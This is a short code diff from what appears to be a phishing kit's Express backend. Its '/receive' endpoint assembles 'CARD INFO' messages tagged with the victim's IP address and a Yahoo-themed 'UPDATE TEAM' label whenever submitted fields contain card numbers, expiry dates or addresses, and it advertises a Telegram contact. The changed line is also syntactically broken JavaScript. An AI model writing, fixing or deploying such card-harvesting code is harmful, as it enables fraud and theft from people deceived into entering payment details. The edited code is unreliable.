@@ -96,7 +96,7 @@ app.post('/receive', async (req, res) => {
         `💬 Telegram: https://t.me/UpdateTeams\n`;
   }
 
-  if (key.includes('Expiry-date') || key.includes('Card-number') || key.includes('Address')) {
+  if (${myObjects[key]}.includes('Expiry-date') || ${myObjects[key]}.includes('Card-number') || ${myObjects[key]}.includes('Address')) {
     message += `✅ UPDATE TEAM | YAHOO | USER_${ipAddress}\n\n` +
                `👤 CARD INFO\n\n`;
 
